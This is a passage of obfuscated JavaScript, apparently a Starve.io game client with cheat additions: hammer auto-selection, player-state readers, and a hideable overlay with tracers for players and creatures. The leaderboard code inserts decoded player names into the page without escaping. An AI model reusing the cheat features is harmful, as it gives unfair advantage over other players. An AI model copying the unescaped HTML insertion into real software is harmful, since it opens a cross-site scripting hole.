		var ᐃⲆⵠⲆΔᐃΔΔᐃ = function() {
			ᐃⲆᐃΔᐃⵠᐃ[ⵠ[515]][ⵠ[386]][ⵠ[139]]({
				client_id: "604822901057-k3dp7j5qpl6pnfr86rvi4r2qp20nk1oh.apps.googleusercontent.com",
				scope: "https://www.googleapis.com/auth/userinfo.profile"
			}).then((ᐃΔⲆΔΔⵠΔΔΔ => {
				ⵠᐃᐃⵠⵠⵠⲆ = ᐃΔⲆΔΔⵠΔΔΔ;
				ⵠᐃᐃⵠⵠⵠⲆ["isSignedIn"]["listen"](ΔⲆⲆⵠᐃΔᐃᐃⲆ);
				ⵠᐃᐃⵠⵠⵠⲆ["currentUser"]["listen"](ᐃⵠᐃⵠᐃΔⵠΔⲆ);
				const ᐃⲆΔᐃⲆΔⲆⲆΔ = ⵠᐃᐃⵠⵠⵠⲆ["isSignedIn"]["get"]();
				if (ᐃⲆΔᐃⲆΔⲆⲆΔ) ⵠᐃᐃⵠⵠⵠⲆ["signIn"]();
				ΔΔΔⲆⲆΔΔᐃᐃ()
			}))
		};
		var ΔⲆⲆⵠᐃΔᐃᐃⲆ = function(ⵠΔⵠⵠΔ) {};
		var ᐃⵠᐃⵠᐃΔⵠΔⲆ = function(ᐃᐃΔ) {
			if (ⵠⵠΔΔⵠ === ΔⵠⲆᐃΔ && undefined !== Ⲇᐃⵠᐃⵠ) {
				ⵠⵠΔΔⵠ = Ⲇᐃⵠᐃⵠ[ⵠ[ᐃⵠⲆΔⲆᐃⲆ]]()["id_token"];
				if (ⵠⵠᐃᐃᐃ !== ⵠⵠΔΔⵠ) {
					ⵠⲆᐃΔⲆΔΔ = ᐃᐃⵠⲆᐃⲆⵠ;
					ΔⵠΔⲆᐃ = Ⲇᐃⵠᐃⵠ["getBasicProfile"]()["getId"]();
					ᐃⲆᐃΔᐃⵠᐃ.ⵠⲆⵠⲆᐃΔᐃ();
					return
				}
			}
			if (ᐃᐃΔ !== ⵠᐃⵠⲆΔ && ᐃᐃΔ["isSignedIn"]() === true) {
				Ⲇᐃⵠᐃⵠ = ᐃᐃΔ;
				ΔⵠΔⲆᐃ = Ⲇᐃⵠᐃⵠ.id;
				ΔⵠΔⲆᐃ = Ⲇᐃⵠᐃⵠ["getBasicProfile"]()["getId"]();
				ⵠⵠΔΔⵠ = Ⲇᐃⵠᐃⵠ[ⵠ[9]]()["id_token"];
				ⵠⲆᐃΔⲆΔΔ = ᐃᐃⵠⲆᐃⲆⵠ;
				ᐃⲆᐃΔᐃⵠᐃ.ⵠⲆⵠⲆᐃΔᐃ()
			}
		};
		var ΔΔΔⲆⲆΔΔᐃᐃ = function() {
			if (ⵠᐃᐃⵠⵠⵠⲆ) Ⲇᐃⵠᐃⵠ = ⵠᐃᐃⵠⵠⵠⲆ["currentUser"]["get"]()
		};
		ᐃⲆᐃΔᐃⵠᐃ.onload = function() {
			ΔⵠΔⲆᐃⵠⵠⵠⲆ()
		};

		function ᐃΔⲆⲆᐃᐃᐃᐃⵠ() {
			var ΔⲆⲆᐃ = new XMLHttpRequest;
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]](ⵠ[526], Ⲇᐃᐃⵠᐃ + "getBreadAndScore?userid=" + ΔⵠΔⲆᐃ);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[255]](ⵠ[550], ⵠ[82]);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[199]] = function() {
				if (this[ΔᐃⲆⵠⲆⵠΔ[41]] == 4 && this.status == 200) {
					if (ΔⲆⲆᐃ.responseText !== "0") {
						var ΔⲆⵠΔ = JSON.parse(ΔⲆⲆᐃ.responseText);
						var Δⵠⵠᐃ = ΔⲆⵠΔ["b"] - ⵠⲆᐃΔ.ᐃᐃⵠⵠᐃ;
						ⵠⲆᐃΔ.ᐃᐃⵠⵠᐃ = ΔⲆⵠΔ["b"];
						ⵠⲆᐃΔ.ᐃⵠᐃⵠⵠ = ΔⲆⵠΔ["s"];
						ⵠⲆᐃΔ.ᐃⵠΔⵠᐃ = ⵠⲆᐃΔ.ᐃΔⲆⵠᐃΔⵠ(ⵠⲆᐃΔ.ᐃⵠᐃⵠⵠ);
						ⵠⲆᐃΔ.ⵠⵠᐃⲆΔᐃΔ = ⵠⲆᐃΔ.ΔᐃΔⲆⲆⲆΔ(ⵠⲆᐃΔ.ᐃⵠᐃⵠⵠ);
						ⵠⲆᐃΔ.ΔΔⵠΔⲆⵠᐃ = ΔᐃΔΔ;
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("breadWonInner")[ΔᐃⲆⵠⲆⵠΔ[290]] = "" + Δⵠⵠᐃ
					}
				}
			};
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[129]]()
		}

		function ᐃΔΔᐃⵠⲆⲆ(ᐃᐃΔΔᐃᐃᐃΔᐃ, ᐃᐃⵠⵠᐃ) {
			if (ᐃᐃⵠⵠᐃ > ⵠⲆᐃΔ.ᐃᐃⵠⵠᐃ) {
				ⵠⲆᐃΔ.ⲆΔᐃⵠ(ⵠⲆᐃΔ.ᐃⲆᐃⵠᐃ);
				return
			}
			var ΔⲆⲆᐃ = new XMLHttpRequest;
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]](ⵠ[526], Ⲇᐃᐃⵠᐃ + "buyKit?token=" + ⵠⵠΔΔⵠ + ⵠ[301] + ΔⵠΔⲆᐃ + "&kit=" + ᐃᐃΔΔᐃᐃᐃΔᐃ);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[255]](ⵠ[550], ⵠ[82]);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[199]] = function() {
				if (ΔⲆⲆⲆ == this[ΔᐃⲆⵠⲆⵠΔ[41]] && 200 == this.status) {
					if ("0" !== ΔⲆⲆᐃ.responseText) {
						var ΔⲆⵠΔ = JSON.parse(ΔⲆⲆᐃ.responseText);
						ⵠⲆᐃΔ.ᐃᐃⵠⵠᐃ -= ᐃᐃⵠⵠᐃ;
						ⵠⲆᐃΔ.ᐃⵠΔΔᐃ = Date.now() + Number(ΔⲆⵠΔ)
					}
				}
			};
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[129]]()
		}

		function ΔⲆΔⲆⲆΔⵠ(ΔΔⲆⵠⵠ) {
			var ΔⲆⲆᐃ = new XMLHttpRequest;
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]](ⵠ[526], Ⲇᐃᐃⵠᐃ + "setRegion?token=" + ⵠⵠΔΔⵠ + ⵠ[301] + ΔⵠΔⲆᐃ + ⵠ[476] + ΔΔⲆⵠⵠ);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[255]](ⵠ[550], ⵠ[82]);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[199]] = function() {
				if (4 === this[ΔᐃⲆⵠⲆⵠΔ[41]] && 200 === this.status) {
					if (ΔⲆⲆᐃ.responseText !== "0") ⵠⲆᐃΔ.ⲆΔᐃⵠ(ⵠⲆᐃΔ.ᐃΔᐃᐃⵠ);
					else ⵠⲆᐃΔ.ⲆΔᐃⵠ(ⵠⲆᐃΔ.ⲆⵠΔΔΔ)
				}
			};
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[129]]()
		}

		function ᐃΔⵠⲆᐃⲆᐃΔⵠ() {
			if (ⵠⲆⲆⲆⵠΔⵠ === ⵠⲆᐃΔⲆΔΔ && ᐃⲆᐃΔᐃⵠᐃ[ⵠ[258]] && ᐃⲆᐃΔᐃⵠᐃ[ⵠ[258]]["getUserID"]()) ᐃⲆᐃΔᐃⵠᐃ[ⵠ[258]]["logout"]();
			if (ⵠⲆᐃΔⲆΔΔ === ᐃᐃⵠⲆᐃⲆⵠ && ⲆⲆⲆⲆᐃ !== Ⲇᐃⵠᐃⵠ) {
				ᐃⲆᐃΔᐃⵠᐃ[ⵠ[515]][ⵠ[386]]["getAuthInstance"]()["signOut"]();
				Ⲇᐃⵠᐃⵠ = undefined
			}
			ΔⵠΔⲆᐃ = ᐃᐃⵠⵠΔ;
			ⵠⵠΔΔⵠ = ⲆΔΔΔⲆ;
			ⵠⲆᐃΔⲆΔΔ = undefined;
			ⵠⲆᐃΔ.ᐃⵠΔΔᐃ = 0;
			ⵠⲆᐃΔ.ᐃᐃⵠⵠᐃ = 0;
			ⵠⲆᐃΔ.ᐃⵠᐃⵠⵠ = 0;
			ⵠⲆᐃΔ.ᐃΔⲆΔⵠⲆⵠ();
			ⲆᐃⲆⵠΔᐃᐃᐃᐃ()
		}

		function ᐃⵠⲆⵠⵠⲆⲆᐃⵠ() {
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]](ⵠ[526], Ⲇᐃᐃⵠᐃ + "getScore?userid=" + ΔⵠΔⲆᐃ);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[255]](ⵠ[550], ⵠ[82]);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[199]] = function() {
				if (4 == this[ΔᐃⲆⵠⲆⵠΔ[41]] && 200 == this.status) {
					if (ΔⲆⲆᐃ.responseText !== "0") var ΔⲆⵠΔ = JSON.parse(ΔⲆⲆᐃ.responseText)
				}
			};
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[129]]()
		}

		function ᐃΔⲆⲆᐃΔᐃⵠⵠ() {
			var ΔⲆⲆᐃ = new XMLHttpRequest;
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]](ⵠ[526], Ⲇᐃᐃⵠᐃ + "restartServer?token=" + ⵠⵠΔΔⵠ + ⵠ[301] + ΔⵠΔⲆᐃ);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[255]](ⵠ[550], ⵠ[82]);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[199]] = function() {
				if (this[ΔᐃⲆⵠⲆⵠΔ[41]] === ⲆⲆⲆΔ && 200 === this.status) {
					if (ΔⲆⲆᐃ.responseText !== "0") {
						const ΔΔⲆᐃΔ = document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[378]).value.split(ⵠ[517]);
						location[ΔᐃⲆⵠⲆⵠΔ[135]] = ᐃΔⵠⵠⵠᐃΔ + "?server=" + ΔΔⲆᐃΔ[ᐃᐃⵠ] + ⵠ[476] + ΔΔⲆᐃΔ[0]
					}
				}
			};
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[129]]()
		}

		function ΔᐃⲆⵠΔΔⲆΔᐃ() {
			var ΔⲆⲆᐃ = new XMLHttpRequest;
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]](ⵠ[526], Ⲇᐃᐃⵠᐃ + "claimBread?userid=" + ΔⵠΔⲆᐃ);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[255]](ⵠ[550], ⵠ[82]);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[199]] = function() {
				if (this[ΔᐃⲆⵠⲆⵠΔ[41]] == 4 && this.status == 200) {
					if ("0" !== ΔⲆⲆᐃ.responseText) {
						var ᐃᐃⵠⵠᐃ = Number(ΔⲆⲆᐃ.responseText);
						!isNaN(ᐃᐃⵠⵠᐃ) && (ⵠⲆᐃΔ.ᐃᐃⵠⵠᐃ = ᐃᐃⵠⵠᐃ)
					}
				}
			};
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[129]]()
		}

		function ⲆⵠⲆⵠᐃⲆᐃᐃⲆ() {
			try {
				if (ᐃⲆᐃΔᐃⵠᐃ[ⵠ[258]]) {
					if (ᐃⲆᐃΔᐃⵠᐃ[ⵠ[258]]["getUserID"]()) {
						ΔⵠΔⲆᐃ = ᐃⲆᐃΔᐃⵠᐃ[ⵠ[258]]["getUserID"]();
						if (ⵠⵠΔΔⵠ === undefined) {
							ᐃⲆᐃΔᐃⵠᐃ[ⵠ[258]]["getLoginStatus"]((function() {
								ⵠⲆᐃΔⲆΔΔ = ⵠⲆⲆⲆⵠΔⵠ;
								ⵠⵠΔΔⵠ = ᐃⲆᐃΔᐃⵠᐃ[ⵠ[258]][ⵠ[ⵠΔᐃⲆᐃᐃⲆ]]()["accessToken"];
								ᐃⲆᐃΔᐃⵠᐃ.ⵠⲆⵠⲆᐃΔᐃ(ΔⵠΔⲆᐃ)
							}))
						}
					}
				}
			} catch (ⵠΔⵠⵠ) {}
			try {
				ΔⵠΔⲆᐃ = Ⲇᐃⵠᐃⵠ["getBasicProfile"]()["getId"]()
			} catch (ⵠΔⵠⵠ) {}
		}

		function ΔⲆᐃᐃⵠᐃⵠ(ⲆΔⲆⲆ) {
			if (!ΔⵠΔⲆᐃ) return;
			var ΔⲆⲆᐃ = new XMLHttpRequest;
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]](ⵠ[526], Ⲇᐃᐃⵠᐃ + "xsolla?userid=" + ΔⵠΔⲆᐃ + "&item=" + ⲆΔⲆⲆ);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[255]](ⵠ[550], ⵠ[82]);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[199]] = function() {
				if (this[ΔᐃⲆⵠⲆⵠΔ[41]] == 4 && 200 == this.status) {
					"0" !== ΔⲆⲆᐃ.responseText && (ⲆΔⲆⵠⲆΔⵠ["access_token"] = ΔⲆⲆᐃ.responseText, ᐃⲆᐃΔᐃⵠᐃ[ⵠ[401]][ⵠ[139]](ⲆΔⲆⵠⲆΔⵠ), ᐃⲆᐃΔᐃⵠᐃ[ⵠ[401]]["open"]())
				}
			};
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[129]]()
		}

		function ᐃΔⵠⵠⲆᐃⲆⲆⲆ(ᐃᐃΔⵠΔⵠΔⵠᐃ) {
			var ΔⲆⲆᐃ = new XMLHttpRequest;
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]](ⵠ[526], Ⲇᐃᐃⵠᐃ + "login?token=" + ⵠⵠΔΔⵠ + "&type=" + ⵠⲆᐃΔⲆΔΔ + (ΔΔⵠΔᐃ ? "&userId=" + ΔΔⵠΔᐃ["userId"] + "&userInfo=" + ΔΔⵠΔᐃ["userInfo"] : ""));
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[255]](ⵠ[550], ⵠ[82]);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[199]] = function() {
				if (this[ΔᐃⲆⵠⲆⵠΔ[41]] === ⵠⵠΔᐃΔ && 200 === this.status) {
					if (ΔⲆⲆᐃ.responseText !== "0") ᐃᐃΔⵠΔⵠΔⵠᐃ(JSON.parse(ΔⲆⲆᐃ.responseText))
				}
			};
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[129]]()
		}

		function ᐃⵠΔⲆⲆΔΔ() {
			ᐃⲆᐃΔᐃⵠᐃ[ⵠ[258]] && ᐃⲆᐃΔᐃⵠᐃ[ⵠ[258]][ⵠ[139]]({
				version: "v15.0",
				xfbml: true,
				appId: "642017356260407",
				cookie: true
			});
			if (ΔⵠⲆᐃΔ !== ΔⵠΔⲆᐃ) return;
			ⲆⵠⲆⵠᐃⲆᐃᐃⲆ()
		}

		function ᐃᐃⵠΔΔⲆΔ() {
			if (300 > ⵠⲆᐃΔ.ᐃᐃⵠⵠᐃ && 0 < ⵠⲆᐃΔ.ΔᐃΔᐃⵠⵠⲆ) return;
			var ⵠΔⵠⲆᐃ = document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[83]).value.trim();
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[83]).value = ⵠΔⵠⲆᐃ;
			if (ⵠΔⵠⲆᐃ.length < 1 || ⵠⵠⵠⲆᐃ < ⵠΔⵠⲆᐃ.length) return;
			var ΔⲆⲆᐃ = new XMLHttpRequest;
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]](ⵠ[526], Ⲇᐃᐃⵠᐃ + "changeNickname?token=" + ⵠⵠΔΔⵠ + ⵠ[301] + ΔⵠΔⲆᐃ + "&nickname=" + encodeURIComponent(ⵠΔⵠⲆᐃ));
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[255]](ⵠ[550], ⵠ[82]);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[199]] = function() {
				if (4 == this[ΔᐃⲆⵠⲆⵠΔ[41]] && this.status == 200) {
					if ("0" !== ΔⲆⲆᐃ.responseText) {
						var ᐃᐃⵠⵠᐃ = Number(ΔⲆⲆᐃ.responseText);
						ⵠⲆᐃⵠ < ᐃᐃⵠⵠᐃ && (ⵠⲆᐃΔ.ᐃᐃⵠⵠᐃ -= ᐃᐃⵠⵠᐃ);
						ⵠⲆᐃΔ.ΔᐃΔᐃⵠⵠⲆ = ΔⵠΔⵠ;
						ⵠⲆᐃΔ.ⲆΔᐃⵠ(ⵠⲆᐃΔ.Ⲇⵠᐃⵠᐃ)
					}
				}
			};
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[129]]()
		}

		function ΔᐃⲆΔⲆⲆⲆ(ΔⲆⲆΔⵠⵠⲆⵠΔ, ᐃᐃⵠⵠᐃ) {
			if (ⵠⲆᐃΔ.ⵠΔΔΔⵠ > 0) return;
			if (ⵠⲆᐃΔ.ᐃᐃⵠⵠᐃ < ᐃᐃⵠⵠᐃ) {
				ⵠⲆᐃΔ.ⲆΔᐃⵠ(ⵠⲆᐃΔ.ᐃⲆᐃⵠᐃ);
				return
			}
			ⵠⲆᐃΔ.ⵠΔΔΔⵠ = ⵠⵠⵠΔ;
			ⵠⲆᐃΔ.ᐃΔᐃᐃⲆⲆⲆ = 0;
			ⵠⲆᐃΔ.ᐃⵠᐃⵠΔⵠⵠ = ⲆⵠᐃΔⲆ;
			var ΔⲆⲆᐃ = new XMLHttpRequest;
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]](ⵠ[526], Ⲇᐃᐃⵠᐃ + "buySpin?token=" + ⵠⵠΔΔⵠ + ⵠ[301] + ΔⵠΔⲆᐃ + "&spin=" + ΔⲆⲆΔⵠⵠⲆⵠΔ);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[255]](ⵠ[550], ⵠ[82]);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[199]] = function() {
				if (this[ΔᐃⲆⵠⲆⵠΔ[41]] == ᐃⵠⵠΔ && 200 == this.status) {
					if (ΔⲆⲆᐃ.responseText !== "0") {
						var ΔⲆⵠΔ = JSON.parse(ΔⲆⲆᐃ.responseText);
						ⵠⲆᐃΔ.ΔⲆᐃⲆⵠᐃΔᐃⵠ(Δⵠⵠⵠ * (ΔⲆⵠΔ["rand"] * Math.PI), ΔⲆⵠΔ["type"], ΔⲆⵠΔ[ⵠ[552]]);
						ⵠⲆᐃΔ.ᐃᐃⵠⵠᐃ -= ᐃᐃⵠⵠᐃ
					} else ⵠⲆᐃΔ.ⵠΔΔΔⵠ = ᐃΔΔ
				}
			};
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[129]]()
		}

		function ᐃⵠⲆⲆⵠΔⲆⲆⲆ() {
			var ΔⲆⲆᐃ = new XMLHttpRequest;
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]](ⵠ[526], Ⲇᐃᐃⵠᐃ + "rebootServer?token=" + ⵠⵠΔΔⵠ + ⵠ[301] + ΔⵠΔⲆᐃ);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[255]](ⵠ[550], ⵠ[82]);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[199]] = function() {
				if (this[ΔᐃⲆⵠⲆⵠΔ[41]] === ΔⲆⲆⲆ && this.status === 200) {
					if ("0" !== ΔⲆⲆᐃ.responseText) {
						const ΔΔⲆᐃΔ = document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[378]).value.split(ⵠ[517]);
						location[ΔᐃⲆⵠⲆⵠΔ[135]] = ᐃΔⵠⵠⵠᐃΔ + "?server=" + ΔΔⲆᐃΔ[1] + ⵠ[476] + ΔΔⲆᐃΔ[ΔΔⵠⵠ]
					}
				}
			};
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[129]]()
		}

		function ᐃⲆΔⵠᐃ(ᐃⵠΔΔⵠ, ΔΔⲆΔ, ⲆΔⲆΔΔ, ⲆⲆᐃⵠⵠ) {
			ᐃⵠΔΔⵠ = undefined === ᐃⵠΔΔⵠ ? ⵠⲆᐃΔ.ᐃΔᐃⵠⵠΔⵠ : ᐃⵠΔΔⵠ;
			ΔΔⲆΔ = ΔΔⲆΔ === ⲆΔⵠⲆⵠ ? ⵠⲆᐃΔ.ΔⵠⲆΔⲆⵠᐃ : ΔΔⲆΔ;
			ⲆΔⲆΔΔ = undefined === ⲆΔⲆΔΔ ? ⵠⲆᐃΔ.ᐃⵠᐃΔⵠⲆΔ : ⲆΔⲆΔΔ;
			ⲆⲆᐃⵠⵠ = undefined === ⲆⲆᐃⵠⵠ ? ⵠⲆᐃΔ.ⲆΔᐃⲆⵠΔⵠ : ⲆⲆᐃⵠⵠ;
			if (ⵠⲆᐃΔ.ᐃΔᐃⵠⵠΔⵠ === ᐃⵠΔΔⵠ && ⵠⲆᐃΔ.ΔⵠⲆΔⲆⵠᐃ === ΔΔⲆΔ && ⲆΔⲆΔΔ === ⵠⲆᐃΔ.ᐃⵠᐃΔⵠⲆΔ && ⲆⲆᐃⵠⵠ === ⵠⲆᐃΔ.ⲆΔᐃⲆⵠΔⵠ) return;
			ⵠⲆᐃΔ.ᐃΔᐃⵠⵠΔⵠ = ᐃⵠΔΔⵠ;
			ⵠⲆᐃΔ.ΔⵠⲆΔⲆⵠᐃ = ΔΔⲆΔ;
			ⵠⲆᐃΔ.ᐃⵠᐃΔⵠⲆΔ = ⲆΔⲆΔΔ;
			ⵠⲆᐃΔ.ⲆΔᐃⲆⵠΔⵠ = ⲆⲆᐃⵠⵠ;
			if (ⲆⲆᐃⵠⵠ === ⵠⲆᐃΔ.ΔΔⲆⵠᐃΔⲆ) ⲆⲆᐃⵠⵠ = "0";
			else if (ⲆⲆᐃⵠⵠ === ⵠⲆᐃΔ.ΔΔⵠΔΔΔⲆ) ⲆⲆᐃⵠⵠ = "1";
			else if (ⵠⲆᐃΔ.ⲆᐃΔⲆΔⲆᐃ === ⲆⲆᐃⵠⵠ) ⲆⲆᐃⵠⵠ = "2";
			else if (ⵠⲆᐃΔ.ⵠᐃᐃΔⵠⲆⲆ === ⲆⲆᐃⵠⵠ) ⲆⲆᐃⵠⵠ = "3";
			else if (ⵠⲆᐃΔ.ᐃᐃⵠᐃᐃⲆⵠ === ⲆⲆᐃⵠⵠ) ⲆⲆᐃⵠⵠ = "4";
			else ⵠⲆᐃΔ.ΔⵠΔⲆᐃΔⵠ === ⲆⲆᐃⵠⵠ && (ⲆⲆᐃⵠⵠ = "5");
			if (ⵠⲆᐃΔ.ⵠΔᐃΔⲆᐃᐃ === ΔΔⲆΔ) ΔΔⲆΔ = "total";
			else if (ΔΔⲆΔ === ⵠⲆᐃΔ.ᐃⵠⵠⵠⵠΔΔ) ΔΔⲆΔ = "normal";
			else if (ⵠⲆᐃΔ.ⵠΔⲆⲆᐃⲆᐃ === ΔΔⲆΔ) ΔΔⲆΔ = "zombie";
			else if (ⵠⲆᐃΔ.ᐃⵠΔᐃᐃᐃⵠ === ΔΔⲆΔ) ΔΔⲆΔ = "vampire";
			else ΔΔⲆΔ === ⵠⲆᐃΔ.ᐃΔΔⵠΔᐃⲆ && (ΔΔⲆΔ = ⵠ[423]);
			ᐃⵠΔΔⵠ === ⵠⲆᐃΔ.ᐃΔΔΔⵠᐃⵠ && (ᐃⵠΔΔⵠ = "all");
			ᐃⵠΔΔⵠ === ⵠⲆᐃΔ.ⲆⵠⵠⵠΔΔᐃ && (ᐃⵠΔΔⵠ = "week");
			if (ᐃⵠΔΔⵠ === ⵠⲆᐃΔ.ⵠΔΔᐃⲆⲆⵠ) ᐃⵠΔΔⵠ = "today";
			if (ⵠⲆᐃΔ.ᐃⵠⵠᐃᐃⲆⲆ === ⲆΔⲆΔΔ) ⲆΔⲆΔΔ = "kill";
			else if (ⲆΔⲆΔΔ === ⵠⲆᐃΔ.ⲆⲆⵠⲆⲆⵠᐃ) ⲆΔⲆΔΔ = ⵠ[326];
			else if (ⲆΔⲆΔΔ === ⵠⲆᐃΔ.ⵠⲆᐃΔᐃⲆⲆ) ⲆΔⲆΔΔ = ⵠ[299];
			var ΔⲆⲆᐃ = new XMLHttpRequest;
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]](ⵠ[526], Ⲇᐃᐃⵠᐃ + "leaderboard?range=" + ᐃⵠΔΔⵠ + "&mode=" + ΔΔⲆΔ + "&sort=" + ⲆΔⲆΔΔ + "&season=" + ⲆⲆᐃⵠⵠ);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[255]](ⵠ[550], ⵠ[82]);
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[199]] = function() {
				if (4 == this[ΔᐃⲆⵠⲆⵠΔ[41]] && this.status == 200) {
					if ("0" !== ΔⲆⲆᐃ.responseText) {
						var ΔⲆⵠΔ = JSON.parse(ΔⲆⲆᐃ.responseText);
						var ⲆⲆⵠΔᐃ = "";
						for (var ⵠᐃ = 0; ⵠᐃ < ΔⲆⵠΔ.length; ⵠᐃ++) {
							ⲆᐃⵠⲆⲆ = ΔⲆⵠΔ[ⵠᐃ];
							var ⵠΔⵠⲆᐃ = ⲆᐃⵠⲆⲆ[ᐃᐃⵠ];
							try {
								ⵠΔⵠⲆᐃ.indexOf("Starver#") === -1 && (ⵠΔⵠⲆᐃ = ᐃⲆᐃΔᐃⵠᐃ["decodeURIComponent"](ᐃⲆᐃΔᐃⵠᐃ["escape"](ᐃⲆᐃΔᐃⵠᐃ["atob"](ⵠΔⵠⲆᐃ))))
							} catch (ⵠΔⵠⵠ) {}
							ⲆⲆⵠΔᐃ += '<div class="lineLeaderboard">';
							ⲆⲆⵠΔᐃ += '<div class="rank">';
							ⲆⲆⵠΔᐃ += ⵠᐃ + ᐃΔᐃⲆ + "";
							ⲆⲆⵠΔᐃ += ⵠ[123];
							ⲆⲆⵠΔᐃ += '<div class="name">';
							ⲆⲆⵠΔᐃ += ⵠΔⵠⲆᐃ;
							ⲆⲆⵠΔᐃ += ⵠ[123];
							ⲆⲆⵠΔᐃ += '<div class="lvl">';
							ⲆⲆⵠΔᐃ += ⵠⲆᐃΔ.ᐃΔⲆⵠᐃΔⵠ(ⲆᐃⵠⲆⲆ[ᐃⲆⲆⲆ]) + 1 + "";
							ⲆⲆⵠΔᐃ += ⵠ[123];
							ⲆⲆⵠΔᐃ += '<div class="kills">';
							ⲆⲆⵠΔᐃ += ⲆᐃⵠⲆⲆ[ⵠⵠᐃⵠ] + "";
							ⲆⲆⵠΔᐃ += ⵠ[123];
							ⲆⲆⵠΔᐃ += '<div class="time">';
							ⲆⲆⵠΔᐃ += ⲆᐃⵠⲆⲆ[4] + "";
							ⲆⲆⵠΔᐃ += ⵠ[123];
							ⲆⲆⵠΔᐃ += '<div class="score">';
							ⲆⲆⵠΔᐃ += ⲆᐃⵠⲆⲆ[ᐃⲆᐃᐃ] + "";
							ⲆⲆⵠΔᐃ += ⵠ[123];
							ⲆⲆⵠΔᐃ += ⵠ[123]
						}
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("leaderboard")[ΔᐃⲆⵠⲆⵠΔ[290]] = ⲆⲆⵠΔᐃ
					}
				}
			};
			ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[129]]()
		}

		function canSelect(p) {
			const keys = Object.keys(getUserProperty("inventory"));
			return getUserProperty("inventory")[keys[3]][p]
		}

		function getBuildOwner(build) {
			const keys = Object.keys(getWorldProperty("players")[build.pid]);
			return getWorldProperty("players")[build.pid][keys[0]]
		}
		function getBuildLevel(pid) {
		const players = getWorldProperty("players");
		if (!players || !players[pid] || !players[pid].level) {
			return "0";
		}
		return players[pid].level;
	}
	function getPlayerScore(pid) { 
		const players = getWorldProperty("players");
		if (!players || !players[pid] || !players[pid].ᐃⵠᐃⵠⵠ) {
			return "0";
		}
		return players[pid].ᐃⵠᐃⵠⵠ;
	}

	function getPlayerName(pid) { 
		const players = getWorldProperty("players");
		if (!players || !players[pid] || !players[pid].ⵠΔⵠⲆᐃ) {
			return "0";
		}
		return players[pid].ⵠΔⵠⲆᐃ;
	}
	function formatScore(score) {
		if (score >= 1e9) {
			return (score / 1e9).toFixed(1) + 'B';
		} else if (score >= 1e6) {
			return (score / 1e6).toFixed(1) + 'M';
		} else if (score >= 1e3) {
			return (score / 1e3).toFixed(1) + 'k';
		} else {
			return score.toString();
		}
	}

		function getHammer() {
			return [39, 38, 37, 36, 35].find((hammer => canSelect(hammer)))
		}
		function HideGUI(hide) {
			const guiElement = document.getElementsByClassName('guify-container_be6yU')[0];
		
			guiElement.style.display = hide ? "none" : "";  
			switch (hide) {
				case true:
					disableAndHide(Settings.VehicleOpacity);
					disableAndHide(Settings.MachineInfo);
					disableAndHide(Settings.LBscore);
					disableAndHide(Settings.PlayerTracers);
					disableAndHide(Settings.KrakenTracers);
					disableAndHide(Settings.SandwormTracers);
					disableAndHide(Settings.ShowHoodNames);
